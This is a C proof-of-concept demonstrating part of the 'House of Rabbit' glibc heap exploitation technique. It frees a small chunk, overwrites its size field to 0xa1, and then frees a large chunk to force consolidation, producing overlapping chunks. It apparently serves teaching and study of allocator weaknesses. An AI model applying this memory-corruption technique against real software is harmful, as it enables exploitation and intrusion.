#include <stdlib.h>
#include <stdio.h>

/*
	The House of Rabbit is a black magic technique that abuses when certain operations happen by triggering certain events at specific timeframes.

This is essentially part 1 of the House of Rabbit.

This POC just uses the fact that consolidation (in older versions) does NOT check the size of the chunk when removing it (during the consolidation process.
This allows for chunks to be overwritten and such pretty easily. 


This POC does the following with the heap: 

0x50 chunk 
0x50 chunk 

Following the free, it edits the first 0x50 chunk to be completely overlapped with the second chunk.
This is done by setting the size to be 0xa0. The heap now looks like the following: 
0xa0 

*/

int main(){

	// Later on, we want to wrap around the address space. However, the SIZE cannot be bigger than av->system_mem. So, we force sysmalloc to extend the sbrk section with these requests. 
	//int* p = malloc(0xa00000); 
	//free(p); 
	//malloc(0xa00000); 
	//free(p); 


	// Create a VERY large chunk and free it in order to trigger the consolidation.
	int8_t* consolidation_ptr = malloc(65536UL + 0x10); 	

	
	int8_t* ptr1 = malloc(0x40); 
	int8_t* ptr2 = malloc(0x40);

	// Has to be a chunk or fake_chunk above the freed pointers. Otherwise, consolidation happens (later) at https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4206 with the top chunk, which will cause issues.

	// Free the pointer prior to altering
	free(ptr1);

	// Set the size to an interesting size. 
	// Additionally, set the prev_inuse bit to 1 so that we do not try to unlink from the chunk below.
	ptr1[-8] = 0xa1;
	//printf("Size of ptr1: 0x%hhx\n", ptr1[-8]);
	
	// There are two main ways to force a consolidation. 
	// The malloc will work. However, once this configurations hits the unsorted_bin to unlink chunks (combine close areas) this just crashes.
	// This is the reason we FREE a large chunk. This triggers the consolidation, but does not attempt to combine chunks in the unsorted bin right away.
	free(consolidation_ptr);

	// Now, ptr1 and ptr2 have been eaten up by the top_chunk! Super interesting :) 
}
